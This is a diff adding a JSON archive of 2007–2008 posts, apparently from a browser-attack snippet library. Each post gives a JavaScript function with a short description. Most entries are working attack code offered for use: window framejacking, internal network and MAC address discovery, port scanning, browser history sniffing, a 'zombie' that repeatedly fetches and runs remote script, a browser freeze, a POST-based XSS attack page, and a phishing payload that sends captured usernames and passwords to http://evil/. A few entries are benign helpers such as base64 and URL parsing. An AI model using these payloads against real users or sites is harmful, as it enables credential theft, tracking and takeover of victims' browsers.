@@ -1,0 +1,122 @@
+[
+  {
+    "author": "pdp",
+    "avatar": "c4db4e65c9f09f2a373fcaefa5e2bfb4",
+    "date": "2007-01-20T11:19:05.000Z",
+    "content": "<h3>Framejack</h3>\r\n\r\n<p>Hijack the current user browser window. This technique employs a single 100%x100% frame that sits on the top of the currently exploited remote content. When the user interacts with the browser window or tab the attacker persists state. This state is lost as soon as the user moves to another URL.</p>\r\n\r\n<pre><code>function framejack(url) {\r\n\tvar ifr = document.createElement('iframe');\r\n\tifr.src= url;\r\n\r\n\tdocument.body.scroll = 'no';\r\n\tdocument.body.appendChild(ifr);\r\n\r\n\tifr.style.position = 'absolute';\r\n\tifr.style.width = ifr.style.height = '100%';\r\n\tifr.style.top = ifr.style.left = ifr.style.border = 0;\r\n}</code></pre>\r\n\r\n<p>All Browsers, JavaScript, hijack, frame, persistency</p>"
+  },
+  {
+    "author": "pdp",
+    "avatar": "c4db4e65c9f09f2a373fcaefa5e2bfb4",
+    "date": "2007-01-20T12:23:34.000Z",
+    "content": "<h3>getNetInfo</h3>\r\n\r\n<p>Retrieve network information. By using this function attackers can retrieve information about the local NATed IP address and host name. This information is highly sensitive since it enables attackers to conduct attacks on Intranet resources.</p>\r\n\r\n<pre><code>function getNetInfo() {\r\n\tvar sock = new java.net.Socket();\r\n\tsock.bind(new java.net.InetSocketAddress('0.0.0.0', 0));\r\n\tsock.connect(new java.net.InetSocketAddress(document.domain, (!document.location.port)?80:document.location.port));\r\n\treturn {domain: sock.getLocalAddress().getHostName(), ip: sock.getLocalAddress().getHostAddress()};\t\r\n}</code></pre>\r\n\r\n<p>Firefox, Opera, Live Connect, JavaScript, Information Gathering</p>"
+  },
+  {
+    "author": "pdp",
+    "avatar": "c4db4e65c9f09f2a373fcaefa5e2bfb4",
+    "date": "2007-01-20T12:33:46.000Z",
+    "content": "<h3>Freeze</h3>\r\n\r\n<p>Freeze the browser for defined time. The time is in milliseconds. While frozen, users are unable to interact with the browser. Certain browsers may terminate the script if the time value is too high. Attackers can use this function to force the browser to wait until certain remote event occurs.</p>\r\n\r\n<pre><code>function freeze(time) {\r\n\tvar date = new Date();\r\n\tvar cur = null;\r\n\t\r\n\tdo {\r\n\t\tcur = new Date();\r\n\t} while(cur - date &lt; time);\r\n}</code></pre>\r\n\r\n<p>All Browsers, JavaScript, freeze, DoS</p>"
+  },
+  {
+    "author": "pdp",
+    "avatar": "c4db4e65c9f09f2a373fcaefa5e2bfb4",
+    "date": "2007-01-20T13:08:18.000Z",
+    "content": "<h3>googleAjaxSearch</h3>\r\n\r\n<p>Perform searches with Google from the browser. This technique can be employed by attackers in order to make self-propagating Ajax worms. The worms finds new targets via Google and uses your browser to attack.</p>\r\n\r\n<pre><code>function googleAjaxSearch(callback, query, key, context) {\r\n\tif (googleAjaxSearch.callbacks == undefined)\r\n\t\tgoogleAjaxSearch.callbacks = new Array();\r\n\r\n\tvar key = (key == undefined)?'internal-documentation':key;\r\n\tvar context = (context == undefined)?0:context;\r\n\r\n\tvar script = document.createElement('script');\r\n\tscript.defer = true;\r\n\tscript.type = 'text/javascript';\r\n\tscript.src = 'http://www.google.com/uds/GwebSearch?callback=googleAjaxSearch.callbacks.callback' + googleAjaxSearch.callbacks.length + '&context=' + context + '&lstkp=0&rsz=large&hl=en&q=' + query + '&key=' + key + '&v=0.1';\r\n\t\r\n\tgoogleAjaxSearch.callbacks['callback' + googleAjaxSearch.callbacks.length] = function (context, results, status) {\r\n\t\tdocument.body.removeChild(script);\r\n\t\tdelete googleAjaxSearch.callbacks['callback' + googleAjaxSearch.callbacks.length];\r\n\t\tcallback(results, query, key, context, status);\r\n\t};\r\n\t\r\n\tdocument.body.appendChild(script);\r\n}</code></pre>\r\n\r\n<p>All Browsers, JavaScript, Google, search</p>"
+  },
+  {
+    "author": "pdp",
+    "avatar": "c4db4e65c9f09f2a373fcaefa5e2bfb4",
+    "date": "2007-01-20T14:05:47.000Z",
+    "content": "<h3>portScan</h3>\r\n\r\n<p>Perform port scanning. This not the only way attackers can perform port scanning. You need to adjust the timeout value in order to achieve the most desired result. This technique can be quite inaccurate sometimes.</p>\r\n\r\n<pre><code>function portScan(callback, target, ports, timeout) {\r\n\tvar timeout = (timeout == null)?100:timeout;\r\n\r\n\tfor (index = 0; index &lt; ports.length; index++)\r\n \t\tnew function () {\r\n\t\t\tvar img = new Image();\r\n\t\t\timg.onload = img.onerror = function () {\r\n\t\t\t\tif (!img) return;\r\n\t\t\t\timg = undefined;\r\n\t\t\t\tcallback(target, ports[index], true);\r\n\t\t\t};\r\n\t\t\timg.src = 'http://' + target + ':' + ports[index];\r\n\r\n\t\t\twindow.setTimeout(function () {\r\n\t\t\t\tif (!img) return;\r\n\t\t\t\timg = undefined;\r\n\t\t\t\tcallback(target, ports[index], false);\r\n\t\t\t}, timeout);\r\n\t\t};\r\n}</code></pre>\r\n\r\n<p>All Browsers, JavaScript, portscan</p>"
+  },
+  {
+    "author": "pdp",
+    "avatar": "c4db4e65c9f09f2a373fcaefa5e2bfb4",
+    "date": "2007-01-20T14:32:36.000Z",
+    "content": "<h3>getURLJ</h3>\r\n\r\n<p>Retrieve remote content by using Java Live Connect. This function is very suitable when a binary files is required to be downloaded. Works only on Live Connect browsers.</p>\r\n\r\n<pre><code>function getURLJ(url) {\r\n\tvar data = null;\r\n\tvar destination = new java.net.URL(url);\r\n\tvar buffer = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 65536);\r\n\tvar stream = destination.getContent();\r\n\t\r\n\twhile (true) {\r\n\t\tvar count = stream.read(buffer);\r\n\t\t\r\n\t\tif (count &lt;= 0)\r\n\t\t\tbreak;\r\n\t\t\t\r\n\t\tvar str = new java.lang.String(buffer, 0, count);\r\n\t\tdata += str;\r\n\t}\r\n\t\r\n\tstream.close();\r\n\treturn data;\r\n}</code></pre>\r\n\r\n<p>Firefox, Opera, Live Connect, JavaScript</p>"
+  },
+  {
+    "author": "pdp",
+    "avatar": "c4db4e65c9f09f2a373fcaefa5e2bfb4",
+    "date": "2007-01-21T10:06:06.000Z",
+    "content": "<h3>zombie</h3>\r\n\r\n<p>Attach a zombie. This function will perform queries to \"<strong>url</strong>\" on a regular basis (specified by interval). Retrieved data is evaluated as a JavaScript expressions.</p>\r\n\r\n<pre><code>function zombie(url, interval) {\r\n\tvar interval = (interval == null)?2000:interval;\r\n\r\n\tsetInterval(function () {\r\n\t\tvar script = document.createElement('script');\r\n\t\tscript.defer = true;\r\n\t\tscript.type = 'text/javascript';\r\n\t\tscript.src = url;\r\n\t\tdocument.body.appendChild(script);\r\n\t}, interval);\r\n}</code></pre>\r\n\r\n<p>All Browsers, JavaScript, zombie</p>"
+  },
+  {
+    "author": "pdp",
+    "avatar": "c4db4e65c9f09f2a373fcaefa5e2bfb4",
+    "date": "2007-01-21T10:16:30.000Z",
+    "content": "<h3>getDocument</h3>\r\n\r\n<p>Retrieve the document object in a cross-browser manner. This function is very useful when the attacker want to read the content of a particular iframe or frame.</p>\r\n\r\n<pre><code>function getDocument(target) {\r\n\tif (target == undefined)\r\n\t\treturn document;\r\n\telse if (target.contentDocument)\r\n\t\treturn target.contentDocument;\r\n\telse if (target.contentWindow)\r\n\t\treturn target.contentWindow.document;\r\n\telse if (target.document)\r\n\t\treturn target.document;\r\n\telse\r\n\t\tthrow 'unable to get document object';\r\n}</code></pre>\r\n\r\n<p>All Browsers, JavaScript, document, iframe</p>"
+  },
+  {
+    "author": "pdp",
+    "avatar": "c4db4e65c9f09f2a373fcaefa5e2bfb4",
+    "date": "2007-01-21T10:26:14.000Z",
+    "content": "<h3>historyScan</h3>\r\n\r\n<p>Scan user history. This function enumerates the current user visited links by performing checks on their style.</p>\r\n\r\n<pre><code>function getDocument(target) {\r\n\tif (target == undefined)\r\n\t\treturn document;\r\n\telse if (target.contentDocument)\r\n\t\treturn target.contentDocument;\r\n\telse if (target.contentWindow)\r\n\t\treturn target.contentWindow.document;\r\n\telse if (target.document)\r\n\t\treturn target.document;\r\n\telse\r\n\t\tthrow 'unable to get document object';\r\n}\r\n\r\nfunction historyScan(callback, URLs) {\r\n\tvar iframe = document.createElement('iframe');\r\n\tiframe.style.visibility = 'hidden';\r\n\tdocument.body.appendChild(iframe);\r\n\t\r\n\tvar doc = getDocument(iframe);\r\n\tdoc.open();\r\n\tdoc.write('&lt;style&gt;a:visited{display: none}&lt;/style&gt;');\r\n\tdoc.close();\r\n\t\r\n\tfor (index = 0; index &lt; URLs.length; index++) {\r\n\t\tvar a = doc.createElement('a');\r\n\t\ta.href = URLs[index];\r\n\t\tdoc.body.appendChild(a);\r\n\t\t\r\n\t\tif (a.currentStyle)\r\n\t\t\tvar display = a.currentStyle['display'];\r\n\t\telse\r\n\t\t\tvar display = doc.defaultView.getComputedStyle(a, null).getPropertyValue('display')\r\n\t\t\t\r\n\t\tcallback(URLs[index], display == 'none'?true:false);\r\n\t}\r\n\t\r\n\tdocument.body.removeChild(iframe);\r\n}</code></pre>\r\n\r\n<p>All Browsers, JavaScript, history, scan</p>"
+  },
+  {
+    "author": "pdp",
+    "avatar": "c4db4e65c9f09f2a373fcaefa5e2bfb4",
+    "date": "2007-01-23T17:34:29.000Z",
+    "content": "<h3>b64encode</h3>\r\n\r\n<p>This function encodes a string in base64 format.</p>\r\n\r\n<pre><code>function b64encode(input) {\r\n\tvar b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';\r\n\r\n\tvar result = '';\r\n\tvar chr1, chr2, chr3;\r\n\tvar enc1, enc2, enc3, enc4;\r\n\tvar i = 0;\r\n\t\r\n\tdo {\r\n\t\tchr1 = input.charCodeAt(i++);\r\n\t\tchr2 = input.charCodeAt(i++);\r\n\t\tchr3 = input.charCodeAt(i++);\r\n\t\t\r\n\t\tenc1 = chr1 &gt;&gt; 2;\r\n\t\tenc2 = ((chr1 & 3) &lt;&lt; 4) | (chr2 &gt;&gt; 4);\r\n\t\tenc3 = ((chr2 & 15) &lt;&lt; 2) | (chr3 &gt;&gt; 6);\r\n\t\tenc4 = chr3 & 63;\r\n\t\t\r\n\t\tif (isNaN(chr2)) {\r\n\t\t\tenc3 = enc4 = 64;\r\n\t\t} else if (isNaN(chr3)) {\r\n\t\t\tenc4 = 64;\r\n\t\t}\r\n\t\t\r\n\t\tresult += b64chars.charAt(enc1) + b64chars.charAt(enc2) + b64chars.charAt(enc3) + b64chars.charAt(enc4);\r\n\t} while (i &lt; input.length);\r\n\t\r\n\treturn result;\r\n}</code></pre>\r\n\r\n<p>JavaScript, Cross-platformed, base64, Encodings</p>"
+  },
+  {
+    "author": "pdp",
+    "avatar": "c4db4e65c9f09f2a373fcaefa5e2bfb4",
+    "date": "2007-01-23T17:36:36.000Z",
+    "content": "<h3>b64decode</h3>\r\n\r\n<p>This function decodes base64 strings.</p>\r\n\r\n<pre><code>function b64decode(input) {\r\n\tvar b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';\r\n\r\n\tvar result = '';\r\n\tvar chr1, chr2, chr3;\r\n\tvar enc1, enc2, enc3, enc4;\r\n\tvar i = 0;\r\n\r\n\tvar input = input.replace(/[^A-Za-z0-9\\+\\/\\=]/g, '');\r\n\r\n\tdo {\r\n\t\tenc1 = b64chars.indexOf(input.charAt(i++));\r\n\t\tenc2 = b64chars.indexOf(input.charAt(i++));\r\n\t\tenc3 = b64chars.indexOf(input.charAt(i++));\r\n\t\tenc4 = b64chars.indexOf(input.charAt(i++));\r\n\r\n\t\tchr1 = (enc1 &lt;&lt; 2) | (enc2 &gt;&gt; 4);\r\n\t\tchr2 = ((enc2 & 15) &lt;&lt; 4) | (enc3 &gt;&gt; 2);\r\n\t\tchr3 = ((enc3 & 3) &lt;&lt; 6) | enc4;\r\n\r\n\t\tresult += String.fromCharCode(chr1);\r\n\r\n\t\tif (enc3 != 64)\r\n\t\t\tresult += String.fromCharCode(chr2);\r\n\r\n\t\tif (enc4 != 64)\r\n\t\t\tresult += String.fromCharCode(chr3);\r\n\t} while (i &lt; input.length);\r\n\t\r\n\treturn result;\r\n}</code></pre>\r\n\r\n<p>JavaScript, Cross-platformed, base64, Encodings</p>"
+  },
+  {
+    "author": "kuza55",
+    "avatar": "2f6303f9095f59c14c3097ef4df566f5",
+    "date": "2007-01-24T09:21:27.000Z",
+    "content": "<h3>Firefox B64 Functions</h3>\r\n\r\n<p>These functions are part of the javascript window object in the Gecko engine.</p>\r\n\r\n<pre><code>alert (btoa(\"test\"));\r\nalert (atob(\"dGVzdA==\"));</code></pre>\r\n\r\n<p>JavaScript, Firefox, base64, Encodings</p>"
+  },
+  {
+    "author": "pdp",
+    "avatar": "c4db4e65c9f09f2a373fcaefa5e2bfb4",
+    "date": "2007-02-01T11:58:41.000Z",
+    "content": "<h3>include</h3>\r\n\r\n<p>Load a remote script file. This function is non-blocking which means that you have to wait for the script to load before using its declarations.</p>\r\n\r\n<pre><code>function include(url) {\r\n\tdocument.write('&lt;' + 'script src=\"' + url + '\" language=\"javascript\" type=\"text/javascript\"' + '&gt;' + '&lt;' + '/script' + '&gt;');\r\n}</code></pre>\r\n\r\n<p>JavaScript, All Browsers, include, modules</p>"
+  },
+  {
+    "author": "pdp",
+    "avatar": "c4db4e65c9f09f2a373fcaefa5e2bfb4",
+    "date": "2007-02-01T12:06:55.000Z",
+    "content": "<h3>include</h3>\r\n\r\n<p>Load a remote script file. This function is non-blocking which means that you have to wait for the script to load before using its declarations. For that reason you may want to use the <strong>onload</strong> callback function.</p>\r\n\r\n<pre><code>function include(url, onload) {\r\n\tvar script = document.createElement('script');\r\n\tscript.type = 'text/javascript';\r\n\tscript.onload = onload;\r\n\tscript.src = url;\r\n\tdocument.body.appendChild(script);\r\n}</code></pre>\r\n\r\n<p>Mozilla, Firefox, Opera, include, modules</p>"
+  },
+  {
+    "author": "pdp",
+    "avatar": "c4db4e65c9f09f2a373fcaefa5e2bfb4",
+    "date": "2007-02-11T23:01:53.000Z",
+    "content": "<h3>forcefocus</h3>\r\n\r\n<p>This function can be used to force the focus on a particular element from the current dom.</p>\r\n\r\n<pre><code>function forcefocus(target, timeout) {\r\n\tvar timeout = (timeout == undefined) ? 500 : timeout;\r\n\r\n\ttarget.focus();\r\n\r\n\tsetTimeout(function () {\r\n\t\tforcefocus(target);\r\n\t}, timeout);\r\n}</code></pre>\r\n\r\n<p>All Browsers, focus</p>"
+  },
+  {
+    "author": "pdp",
+    "avatar": "c4db4e65c9f09f2a373fcaefa5e2bfb4",
+    "date": "2007-04-26T09:39:26.000Z",
+    "content": "<h3>walkJSON</h3>\r\n\r\nThis function walk the entire JSON (the <strong>j</strong> parameter) tree. The <strong>c</strong> parameter is the function that handles walked nodes.\r\n\r\n<pre><code>function walkJSON(j, c) {\r\n    if (typeof(c) != 'function') {\r\n        return;\r\n    }\r\n\r\n    for (var i in j) {\r\n        c(i, j[i]);\r\n\r\n        if (j[i] instanceof Array || typeof(j[i]) == 'object') {\r\n            arguments.callee(j[i], c);\r\n        }\r\n    }\r\n}</code></pre>\r\n\r\nuniversal"
+  },
+  {
+    "author": "pdp",
+    "avatar": "c4db4e65c9f09f2a373fcaefa5e2bfb4",
+    "date": "2007-04-26T09:48:43.000Z",
+    "content": "<h3>parseURL</h3>\r\n\r\nThis function parse the URL into an object.\r\n\r\n<pre><code>function parseURL(url) {\r\n\tvar REGEX = /^((\\w+):\\/\\/)?((\\w+):?(\\w+)?@)?([^\\/\\?:]+):?(\\d+)?(\\/?[^\\?#]+)?\\??([^#]+)?#?(\\w*)/;\r\n\t\r\n\tvar fields = {'href': 0, 'username' : 4, 'password' : 5, 'port' : 7, 'protocol' : 2, 'host' : 6, 'hostname' : 6, 'pathname' : 8, 'search' : 9, 'hash' : 10};\r\n\tvar result = new Object();\r\n\tvar r = REGEX.exec(url);\r\n\t\r\n\tfor (var field in fields) {\r\n\t\tresult[field] = r[fields[field]];\r\n\t}\r\n\t\r\n\tresult.hash = result.hash?'#' + result.hash:'#';\r\n\tresult.search = result.search?'?' + result.search:'?';\r\n\tresult.username = result.username?result.username:'';\r\n\tresult.password = result.password?result.password:'';\r\n\t\r\n\tif (result.port == undefined) {\r\n\t\tswitch (result.protocol) {\r\n\t\t\tcase 'http':\r\n\t\t\t\tresult.port = 80;\r\n\t\t\t\tbreak;\r\n\t\t\tcase 'https':\r\n\t\t\t\tresult.port = 443;\r\n\t\t\t\tbreak;\r\n\t\t\tcase 'ftp':\r\n\t\t\t\tresult.port = 21;\r\n\t\t\t\tbreak;\r\n\t\t\tdefault:\r\n\t\t\t\tresult.port = '';\r\n\t\t\t\tbreak;\r\n\t\t}\r\n\t}\r\n\t\r\n\treturn result;\r\n}</code></pre>\r\n\r\nuniversal"
+  },
+  {
+    "author": "Adrian Pastor",
+    "avatar": "ef14ae4ef69235fa6c3709438357819d",
+    "date": "2007-08-15T21:37:31.000Z",
+    "content": "<h3>STICKY PHISHING</h3>\r\n\r\nThis payload launches a phishing attack to the user.  It's sticky cuz it won't stop prompting the victim to enter his username and password until he enters both. Once obtained they are forwarded to a third-party site. Ideal for persistent XSS attacks.\r\n\r\n<pre><code>do{a=prompt(&quot;APP_OR_SITE_NAME: an error has ocurred\\nPlease enter your USERNAME&quot;,&quot;&quot;);b=prompt(&quot;APP_OR_SITE_NAME: an error has ocurred\\nPlease enter your PASSWORD&quot;,&quot;&quot;);} while(a==null || b==null || a==&quot;&quot; || b==&quot;&quot;);alert(&quot;owned!:&quot;+a+&quot;/&quot;+b);window.location=&quot;http://evil/?u=&quot;+a+&quot;&amp;p=&quot;+b</code></pre>\r\n\r\nJavaScript, Universal, Password Theft"
+  },
+  {
+    "author": "Adrian Pastor",
+    "avatar": "ef14ae4ef69235fa6c3709438357819d",
+    "date": "2007-08-15T21:55:58.000Z",
+    "content": "<h3>POST METHOD XSS</h3>\r\n\r\nAttack HTML page for XSS vuls that can only be exploited as a POST request (as opposed to GET)\r\n\r\n<pre><code>&lt;html&gt;\r\n&lt;!-- this page would be hosted on the attacker&apos;s site and the victim would need to be tricked into visiting it --&gt;\r\n&lt;form method=&quot;post&quot; action=&quot;http://target/vulnerable.jsp&quot;&gt;\r\n&lt;input type=&quot;text&quot; name=&quot;param&quot; value=&apos;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&apos;&gt;\r\n&lt;/form&gt;\r\n&lt;script&gt;document.forms[0].submit();&lt;/script&gt;\r\n&lt;/html&gt;</code></pre>\r\n\r\nUniversal, HTML, JavaScript"
+  },
+  {
+    "author": "yUnwEb",
+    "avatar": "13deb608031da5a7c045c444c97b907e",
+    "date": "2008-02-12T06:25:46.000Z",
+    "content": "<h3>MAC ADDRESS</h3>\r\n\r\nYou can steal the user's MAC address with Java 1.6. For Internet Explorer you can use an applet. This information is very sensitive, because the MAC address is a unique identifier. Although it can be easily changed by the user, it can be useful to identify some users with dynamic IP address or using proxies.\r\n\r\n<pre><code>function get_mac() {\r\n    try {\r\n        var ifaces = java.net.NetworkInterface.getNetworkInterfaces()\r\n        var ifaces_list = java.util.Collections.list(ifaces);\r\n        for (var i = 0; i &lt; ifaces_list.size(); i++) {\r\n            var mac = ifaces_list.get(i).getHardwareAddress();\r\n            if (mac) {\r\n                return mac;\r\n            }\r\n        }\r\n    } catch (e) { }\r\n    return false;\r\n}</code></pre>\r\n\r\nFirefox, Opera, Live Connect, Java SE 6, JavaScript, Information Gathering"
+  }
+]
